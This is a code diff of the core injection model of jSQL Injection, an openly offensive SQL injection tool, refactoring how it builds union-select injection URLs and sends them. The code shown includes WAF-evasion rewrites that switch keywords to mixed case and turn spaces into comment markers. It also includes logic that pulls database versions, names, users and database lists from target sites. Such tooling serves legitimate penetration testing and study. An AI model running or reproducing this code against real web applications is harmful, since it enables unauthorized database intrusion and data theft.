@@ -14,14 +14,9 @@ import java.io.BufferedReader;
 import java.io.DataOutputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
-import java.io.UnsupportedEncodingException;
-import java.lang.reflect.Array;
-import java.lang.reflect.Field;
 import java.net.HttpURLConnection;
 import java.net.MalformedURLException;
-import java.net.ProtocolException;
 import java.net.URL;
-import java.net.URLDecoder;
 import java.nio.charset.Charset;
 import java.nio.file.Files;
 import java.nio.file.Paths;
@@ -31,7 +26,6 @@ import java.util.Map;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-import javax.net.ssl.HttpsURLConnection;
 import javax.security.auth.login.LoginException;
 
 import net.sourceforge.spnego.SpnegoHttpURLConnection;
@@ -42,15 +36,13 @@ import org.ietf.jgss.GSSException;
 
 import com.jsql.model.accessible.DataAccess;
 import com.jsql.model.accessible.RessourceAccess;
-import com.jsql.model.bean.database.AbstractElementDatabase;
 import com.jsql.model.bean.util.Request;
-import com.jsql.model.exception.PreparationException;
-import com.jsql.model.exception.StoppableException;
+import com.jsql.model.exception.InjectionFailureException;
+import com.jsql.model.exception.StoppedByUserException;
 import com.jsql.model.injection.method.MethodInjection;
 import com.jsql.model.injection.strategy.NormalStrategy;
 import com.jsql.model.injection.strategy.Strategy;
 import com.jsql.model.injection.vendor.Vendor;
-import com.jsql.model.suspendable.AbstractSuspendable;
 import com.jsql.model.suspendable.SuspendableGetCharInsertion;
 import com.jsql.model.suspendable.SuspendableGetVendor;
 import com.jsql.util.AuthenticationUtil;
@@ -58,6 +50,7 @@ import com.jsql.util.ConnectionUtil;
 import com.jsql.util.PreferencesUtil;
 import com.jsql.util.ProxyUtil;
 import com.jsql.util.StringUtil;
+import com.jsql.util.ThreadUtil;
 
 /**
  * Model in charge of injection.<br>
@@ -75,45 +68,35 @@ public class InjectionModel extends AbstractModelObservable {
     public static final String VERSION_JSQL = "0.75";
     
     /**
-     * List of running jobs.
-     */
-    public Map<AbstractElementDatabase, AbstractSuspendable<?>> suspendables = new HashMap<>();
-    
-    /**
      * i.e, -1 in "[..].php?id=-1 union select[..]"
      */
-    public String charInsertion;
+    private String charInsertion;
     
     /**
      * HTML source of page successfully responding to
      * multiple fields selection (select 1,2,3,..).
      */
-    public String srcSuccess;
+    private String srcSuccess;
     
     /**
      * initialUrl transformed to a correct injection url.
      */
-    public String indexesInUrl;
-    
+    private String indexesInUrl;
+
     /**
      * Current version of database.
      */
-    public String versionDatabase;
+    private String versionDatabase;
     
     /**
      * Selected database.
      */
-    public String nameDatabase;
+    private String nameDatabase;
     
     /**
      * User connected to database.
      */
-    public String username;
-    
-    /**
-     * User authenticated in database.
-     */
-    public String usernameAuthenticated;
+    private String username;
     
     /**
      * Database vendor currently used.
@@ -150,39 +133,41 @@ public class InjectionModel extends AbstractModelObservable {
         String nameSystemArchitecture = System.getProperty("os.arch");
         LOGGER.trace("jSQL Injection v" + VERSION_JSQL + " on java "+ versionJava +"-"+ nameSystemArchitecture +"");
     }
-
-    /**
-     * Prepare the injection process, can be interrupted by the user (via shouldStopAll).
-     * Erase all attributes eventually defined in a previous injection.
-     */
-    public void injection() {
+    
+    public void resetModel() {
         this.charInsertion = null;
         ((NormalStrategy) Strategy.NORMAL.instance()).visibleIndex = null;
         this.indexesInUrl = null;
-
+        
         this.versionDatabase = null;
         this.nameDatabase = null;
         this.username = null;
-        this.usernameAuthenticated = null;
         
-        this.processIsStopped = false;
+        this.setIsStoppedByUser(false);
         this.injectionIsFinished = false;
         
         this.strategy = null;
         
         RessourceAccess.readingIsAllowed = false;
         
-        for (AbstractSuspendable<?> suspendable : this.suspendables.values()) {
-            suspendable.stop();
+        ThreadUtil.reset();
+    }
+
+    /**
+     * Prepare the injection process, can be interrupted by the user (via shouldStopAll).
+     * Erase all attributes eventually defined in a previous injection.
+     */
+    public void injection() {
+        this.resetModel();
+        
+        if (!ProxyUtil.proxyIsResponding()) {
+            return;
         }
-        this.suspendables.clear();
-
+        
+        LOGGER.info("Starting new injection");
+        LOGGER.trace("Connection test...");
+        
         try {
-            ProxyUtil.testProxy();
-
-            LOGGER.info("Starting new injection");
-            LOGGER.trace("Connection test...");
-            
             ConnectionUtil.testConnection();
             
             // Define insertionCharacter, i.e, -1 in "[..].php?id=-1 union select[..]",
@@ -198,11 +183,22 @@ public class InjectionModel extends AbstractModelObservable {
                 LOGGER.info("Type of database undefined, forcing to ["+ this.vendor +"]");
             } else {
                 LOGGER.info("Using database type ["+ this.vendor +"]");
+                
+                Map<String, Object> msgHeader = new HashMap<>();
+                msgHeader.put("Url", ConnectionUtil.urlBase + ConnectionUtil.dataQuery + this.charInsertion);
+                msgHeader.put("Vendor", this.vendor);
+                
+                Request requestDatabaseIdentified = new Request();
+                requestDatabaseIdentified.setMessage("DatabaseIdentified");
+                requestDatabaseIdentified.setParameters(msgHeader);
+                
+                this.sendToViews(requestDatabaseIdentified);
             }
             
             Request requestSetVendor = new Request();
             requestSetVendor.setMessage("SetVendor");
             requestSetVendor.setParameters(this.vendor);
+            
             this.sendToViews(requestSetVendor);
 
             // Test each injection methods: time, blind, error, normal
@@ -228,7 +224,7 @@ public class InjectionModel extends AbstractModelObservable {
                 // No injection possible, increase evasion level and restart whole process
                 this.stepSecurity++;
 
-                LOGGER.warn("Injection failed, testing evasion level " + this.stepSecurity + "...");
+                LOGGER.warn("Injection failed, testing evasion level "+ this.stepSecurity +"...");
                 
                 Request request = new Request();
                 request.setMessage("ResetStrategyLabel");
@@ -240,25 +236,17 @@ public class InjectionModel extends AbstractModelObservable {
                 
                 return;
             } else {
-                throw new PreparationException("Injection failed.");
+                throw new InjectionFailureException();
             }
 
-            //            // Stop injection if database is too old
-            //            if (versionDatabase.charAt(0) == '4' || versionDatabase.charAt(0) == '3') {
-            //                throw new PreparationException("Old database, automatic search is not possible");
-            //            }
-            
             if (!this.isScanning) {
-                // Get the initial informations from database
                 DataAccess.getDatabaseInfos();
-    
-                // Get the databases
                 DataAccess.listDatabases();
             }
             
-            LOGGER.info("Done.");
+            LOGGER.trace("Done");
             this.injectionIsFinished = true;
-        } catch (PreparationException | StoppableException e) {
+        } catch (Exception e) {
             LOGGER.warn(e.getMessage(), e);
         } finally {
             Request request = new Request();
@@ -274,19 +262,17 @@ public class InjectionModel extends AbstractModelObservable {
      * @return source code of current page
      */
     public String inject(String newDataInjection, boolean isUsingIndex) {
-        HttpURLConnection connection = null;
-        URL urlObject = null;
-
         // Temporary url, we go from "select 1,2,3,4..." to "select 1,([complex query]),2...", but keep initial url
-        String urlInjection = ConnectionUtil.urlByUser;
+        String urlInjection = ConnectionUtil.urlBase;
         
         String dataInjection = newDataInjection;
         urlInjection = this.buildURL(urlInjection, isUsingIndex, dataInjection);
 
+        URL urlObject = null;
         try {
             urlObject = new URL(urlInjection);
         } catch (MalformedURLException e) {
-            LOGGER.warn("Malformed URL " + e.getMessage(), e);
+            LOGGER.warn("Incorrect Query Url: "+ e.getMessage(), e);
         }
 
         /**
@@ -296,59 +282,50 @@ public class InjectionModel extends AbstractModelObservable {
         if (ConnectionUtil.dataQuery != null && !"".equals(ConnectionUtil.dataQuery)) {
             urlInjection += this.buildQuery(MethodInjection.QUERY, ConnectionUtil.dataQuery, isUsingIndex, dataInjection);
             try {
-                /*
-                 * Evasion
-                 */
-                switch (stepSecurity) {
-                    /**
-                     * 'Plus' character evasion
-                     */
-                    case 1:
-                        urlInjection = urlInjection
-                            .replaceAll("--\\+", "--")
-                            .replaceAll("7330%2b1", "7331");
-                    break;
+                // Evasion
+                if (stepSecurity == 1) {
+                    // Replace character '+'
+                    urlInjection = urlInjection
+                        .replaceAll("--\\+", "--")
+                        .replaceAll("7330%2b1", "7331");
                     
-                    /**
-                     * Case evasion
-                     */
-                    case 2:
-                        urlInjection = urlInjection
-                            .replaceAll("union\\+", "uNiOn+")
-                            .replaceAll("select\\+", "sElEcT+")
-                            .replaceAll("from\\+", "FrOm+")
-                            .replaceAll("from\\(", "FrOm(")
-                            .replaceAll("where\\+", "wHeRe+")
-                            .replaceAll("([AE])=0x", "$1+lIkE+0x");
-                    break;
+                } else if (stepSecurity == 2) {
+                    // Change case
+                    urlInjection = urlInjection
+                        .replaceAll("union\\+", "uNiOn+")
+                        .replaceAll("select\\+", "sElEcT+")
+                        .replaceAll("from\\+", "FrOm+")
+                        .replaceAll("from\\(", "FrOm(")
+                        .replaceAll("where\\+", "wHeRe+")
+                        .replaceAll("([AE])=0x", "$1+lIkE+0x");
                     
-                    /**
-                     * Case and Space evasion
-                     */
-                    case 3:
-                        urlInjection = urlInjection
-                            .replaceAll("union\\+", "uNiOn/**/")
-                            .replaceAll("select\\+", "sElEcT/**/")
-                            .replaceAll("from\\+", "FrOm/**/")
-                            .replaceAll("from\\(", "FrOm(")
-                            .replaceAll("where\\+", "wHeRe/**/")
-                            .replaceAll("([AE])=0x", "$1/**/lIkE/**/0x");
-                        urlInjection = urlInjection.replaceAll("--\\+", "--")
-                            .replaceAll("\\+", "/**/");
-                    break;
-                    
-                    default:
-                        break;
+                } else if (stepSecurity == 3) {                 
+                    // Change Case and Space
+                    urlInjection = urlInjection
+                        .replaceAll("union\\+", "uNiOn/**/")
+                        .replaceAll("select\\+", "sElEcT/**/")
+                        .replaceAll("from\\+", "FrOm/**/")
+                        .replaceAll("from\\(", "FrOm(")
+                        .replaceAll("where\\+", "wHeRe/**/")
+                        .replaceAll("([AE])=0x", "$1/**/lIkE/**/0x");
+                    urlInjection = urlInjection
+                        .replaceAll("--\\+", "--")
+                        .replaceAll("\\+", "/**/");
                 }
 
                 urlObject = new URL(urlInjection);
             } catch (MalformedURLException e) {
-                LOGGER.warn("Malformed URL " + e.getMessage(), e);
+                LOGGER.warn("Incorrect Evasion Url "+ e.getMessage(), e);
             }
         }
         
+        HttpURLConnection connection;
+        String pageSource = "";
+        
         // Define the connection
         try {
+            
+            // Block Opening Connection
             if (AuthenticationUtil.isKerberos) {
                 String kerberosConfiguration = 
                     Pattern
@@ -363,118 +340,80 @@ public class InjectionModel extends AbstractModelObservable {
                 connection = (HttpURLConnection) urlObject.openConnection();
             }
             
-            connection.setReadTimeout(15000);
-            connection.setConnectTimeout(15000);
+            connection.setReadTimeout(ConnectionUtil.timeOut);
+            connection.setConnectTimeout(ConnectionUtil.timeOut);
             connection.setDefaultUseCaches(false);
-            HttpURLConnection.setFollowRedirects(PreferencesUtil.isFollowingRedirection);
-        } catch (IOException | LoginException | GSSException | PrivilegedActionException e) {
-            LOGGER.warn("Error during connection: " + e.getMessage(), e);
-        }
+            
+            ConnectionUtil.fixJcifsTimeout(connection);
 
-        Map<String, Object> msgHeader = new HashMap<>();
-        msgHeader.put("Url", urlInjection);
-        
-        /**
-         * Build the HEADER and logs infos
-         * #Need primary evasion
-         */
-        if (!"".equals(ConnectionUtil.dataHeader)) {
-            for (String header: this.buildQuery(MethodInjection.HEADER, ConnectionUtil.dataHeader, isUsingIndex, dataInjection).split("\\\\r\\\\n")) {
-                Matcher regexSearch = Pattern.compile("(?s)(.*):(.*)").matcher(header);
-                if (regexSearch.find()) {
-                    String keyHeader = regexSearch.group(1).trim();
-                    String valueHeader = regexSearch.group(2).trim();
-                    try {
-                        if ("Cookie".equalsIgnoreCase(keyHeader)) {
-                            connection.addRequestProperty(keyHeader, valueHeader);
-                        } else {
-                            connection.addRequestProperty(keyHeader, URLDecoder.decode(valueHeader, "UTF-8"));
-                        }
-                    } catch (UnsupportedEncodingException e) {
-                        LOGGER.warn("Unsupported header encoding " + e.getMessage(), e);
+            Map<String, Object> msgHeader = new HashMap<>();
+            msgHeader.put("Url", urlInjection);
+            
+            /**
+             * Build the HEADER and logs infos
+             * #Need primary evasion
+             */
+            if (!"".equals(ConnectionUtil.dataHeader)) {
+                for (String header: this.buildQuery(MethodInjection.HEADER, ConnectionUtil.dataHeader, isUsingIndex, dataInjection).split("\\\\r\\\\n")) {
+                    ConnectionUtil.sanitizeHeaders(connection, header);
+                }
+                
+                msgHeader.put("Header", this.buildQuery(MethodInjection.HEADER, ConnectionUtil.dataHeader, isUsingIndex, dataInjection));
+            }
+    
+            /**
+             * Build the POST and logs infos
+             * #Need primary evasion
+             */
+            if (!"".equals(ConnectionUtil.dataRequest)) {
+                try {
+                    ConnectionUtil.fixCustomRequestMethod(connection, ConnectionUtil.typeRequest);
+                    
+                    connection.setDoOutput(true);
+                    connection.addRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+    
+                    if (ConnectionUtil.typeRequest.matches("PUT|POST")) {
+                        DataOutputStream dataOut = new DataOutputStream(connection.getOutputStream());
+                        dataOut.writeBytes(this.buildQuery(MethodInjection.REQUEST, ConnectionUtil.dataRequest, isUsingIndex, dataInjection));
+                        dataOut.flush();
+                        dataOut.close();
                     }
+                    
+                    msgHeader.put("Post", this.buildQuery(MethodInjection.REQUEST, ConnectionUtil.dataRequest, isUsingIndex, dataInjection));
+                } catch (IOException e) {
+                    LOGGER.warn("Error during Request connection "+ e.getMessage(), e);
                 }
             }
             
-            msgHeader.put("Header", this.buildQuery(MethodInjection.HEADER, ConnectionUtil.dataHeader, isUsingIndex, dataInjection));
-        }
-
-        /**
-         * Build the POST and logs infos
-         * #Need primary evasion
-         */
-        if (!"".equals(ConnectionUtil.dataRequest)) {
-            try {
-                try {
-                    connection.setRequestMethod(ConnectionUtil.typeRequest);
-                    // Check whether we are running on a buggy JRE
-                } catch (final ProtocolException pe) {
-                    try {
-                        final Class<?> httpURLConnectionClass = connection.getClass();
-                        final Class<?> parentClass = httpURLConnectionClass.getSuperclass();
-                        final Field methodField;
-                        
-                        Field methods = parentClass.getDeclaredField("methods");
-                        methods.setAccessible(true);
-                        Array.set(methods.get(connection), 1, ConnectionUtil.typeRequest);
-                        
-                        // If the implementation class is an HTTPS URL Connection, we
-                        // need to go up one level higher in the heirarchy to modify the
-                        // 'method' field.
-                        if (parentClass == HttpsURLConnection.class) {
-                            methodField = parentClass.getSuperclass().getDeclaredField("method");
-                        } else {
-                            methodField = parentClass.getDeclaredField("method");
-                        }
-                        methodField.setAccessible(true);
-                        methodField.set(connection, ConnectionUtil.typeRequest);
-                    } catch (final Exception e) {
-                        throw new RuntimeException(e);
-                    }
+            msgHeader.put("Response", StringUtil.getHTTPHeaders(connection));
+    
+            // Request the web page to the server
+            String line;
+            try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
+                while ((line = reader.readLine()) != null) {
+                    pageSource += line + "\r\n";
                 }
-                
-                connection.setDoOutput(true);
-                connection.addRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-
-                if (ConnectionUtil.typeRequest.matches("PUT|POST")) {
-                    DataOutputStream dataOut = new DataOutputStream(connection.getOutputStream());
-                    dataOut.writeBytes(this.buildQuery(MethodInjection.REQUEST, ConnectionUtil.dataRequest, isUsingIndex, dataInjection));
-                    dataOut.flush();
-                    dataOut.close();
-                }
-                
-                msgHeader.put("Post", this.buildQuery(MethodInjection.REQUEST, ConnectionUtil.dataRequest, isUsingIndex, dataInjection));
             } catch (IOException e) {
-                LOGGER.warn("Error during POST connection " + e.getMessage(), e);
+                // Preserve consoles: ignore read errors
             }
+            
+            // Disable caching of authentication like Kerberos
+            connection.disconnect();
+            
+            msgHeader.put("Source", pageSource);
+            
+            // Inform the view about the log infos
+            Request request = new Request();
+            request.setMessage("MessageHeader");
+            request.setParameters(msgHeader);
+            this.sendToViews(request);
+            
+        } catch (
+            // Exception for Block Opening Connection
+            IOException | LoginException | GSSException | PrivilegedActionException e
+        ) {
+            LOGGER.warn("Error during connection: " + e.getMessage(), e);
         }
-        
-        msgHeader.put("Response", StringUtil.getHTTPHeaders(connection));
-
-        // Request the web page to the server
-        String line, pageSource = "";
-        try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
-            while ((line = reader.readLine()) != null) {
-                pageSource += line + "\r\n";
-            }
-        } catch (MalformedURLException e) {
-            LOGGER.warn("Malformed URL " + e.getMessage(), e);
-        } catch (IOException e) {
-//            /* lot of timeout in local use */
-//            LOGGER.warn("Read error " + e.getMessage(), e);
-            // 
-        }
-        
-        // Disable caching of authentication like Kerberos
-        connection.disconnect();
-        
-        msgHeader.put("Source", pageSource);
-        
-        // Inform the view about the log infos
-        Request request = new Request();
-        request.setMessage("MessageHeader");
-        request.setParameters(msgHeader);
-        this.sendToViews(request);
 
         // return the source code of the page
         return pageSource;
@@ -515,13 +454,15 @@ public class InjectionModel extends AbstractModelObservable {
     }
     
     private String buildQuery(MethodInjection dataType, String paramLead, boolean isUsingIndex, String sqlTrail) {
-        if (ConnectionUtil.methodInjection != dataType || ConnectionUtil.urlByUser.contains("*")) {
-            return paramLead;
+        String query;
+        
+        if (ConnectionUtil.methodInjection != dataType || ConnectionUtil.urlBase.contains("*")) {
+            query = paramLead;
         } else if (paramLead.contains("*")) {
             if (!isUsingIndex) {
-                return paramLead.replace("*", sqlTrail);
+                query = paramLead.replace("*", sqlTrail);
             } else {
-                return 
+                query = 
                     paramLead.replace("*", 
                         this.indexesInUrl.replaceAll(
                             "1337" + ((NormalStrategy) Strategy.NORMAL.instance()).visibleIndex + "7331",
@@ -536,9 +477,9 @@ public class InjectionModel extends AbstractModelObservable {
             }
         } else {
             if (!isUsingIndex) {
-                return paramLead + sqlTrail;
+                query = paramLead + sqlTrail;
             } else {
-                return 
+                query = 
                     paramLead 
                     + this.indexesInUrl.replaceAll(
                         "1337" + ((NormalStrategy) Strategy.NORMAL.instance()).visibleIndex + "7331",
@@ -551,6 +492,8 @@ public class InjectionModel extends AbstractModelObservable {
                 ;
             }
         }
+        
+        return query;
     }
 
     /**
@@ -581,28 +524,30 @@ public class InjectionModel extends AbstractModelObservable {
      * started in a new thread via model function inputValidation().
      */
     public void controlInput(
-        String getData, String postData, String headerData, MethodInjection method, 
-        String httpProtocol, Boolean isScanning
+        String dataQuery, String dataRequest, String dataHeader, MethodInjection methodInjection, 
+        String typeRequest, Boolean isScanning
     ) {
         try {
+            ConnectionUtil.urlByUser = dataQuery;
+            
             // Parse url and GET query string
             ConnectionUtil.dataQuery = "";
-            Matcher regexSearch = Pattern.compile("(.*)(\\?.*)").matcher(getData);
+            Matcher regexSearch = Pattern.compile("(.*)(\\?.*)").matcher(dataQuery);
             if (regexSearch.find()) {
-                URL url = new URL(getData);
-                ConnectionUtil.urlByUser = regexSearch.group(1);
+                URL url = new URL(dataQuery);
+                ConnectionUtil.urlBase = regexSearch.group(1);
                 if (!"".equals(url.getQuery())) {
                     ConnectionUtil.dataQuery = regexSearch.group(2);
                 }
             } else {
-                ConnectionUtil.urlByUser = getData;
+                ConnectionUtil.urlBase = dataQuery;
             }
             
             // Define other methods
-            ConnectionUtil.dataRequest = postData;
-            ConnectionUtil.dataHeader = headerData;
-            ConnectionUtil.methodInjection = method;
-            ConnectionUtil.typeRequest = httpProtocol;
+            ConnectionUtil.dataRequest = dataRequest;
+            ConnectionUtil.dataHeader = dataHeader;
+            ConnectionUtil.methodInjection = methodInjection;
+            ConnectionUtil.typeRequest = typeRequest;
             
             // Reset level of evasion
             this.stepSecurity = 0;
@@ -624,12 +569,46 @@ public class InjectionModel extends AbstractModelObservable {
                 this.sendToViews(request);
             }
         } catch (MalformedURLException e) {
-            LOGGER.warn(e.getMessage(), e);
+            LOGGER.warn("Incorrect Url", e);
             
             // Incorrect URL, reset the start button
             Request request = new Request();
             request.setMessage("EndPreparation");
             this.sendToViews(request);
         }
+    }
+
+    public String getCharInsertion() {
+        return charInsertion;
+    }
+
+    public String getSrcSuccess() {
+        return srcSuccess;
+    }
+
+    public void setSrcSuccess(String srcSuccess) {
+        this.srcSuccess = srcSuccess;
+    }
+
+    public String getIndexesInUrl() {
+        return indexesInUrl;
+    }
+
+    public void setIndexesInUrl(String indexesInUrl) {
+        this.indexesInUrl = indexesInUrl;
+    }
+    
+    public String getDatabaseInfos() {
+        return "Database ["+ this.nameDatabase +"] "
+                + "on "+ this.vendor +" ["+ this.versionDatabase +"] "
+                + "for user ["+ this.username +"]";
+    }
+
+    public void setDatabaseInfos(
+        String versionDatabase, String nameDatabase, String username
+    ) {
+        this.versionDatabase = versionDatabase;
+        this.nameDatabase = nameDatabase;
+        this.username = username;
     }
 }
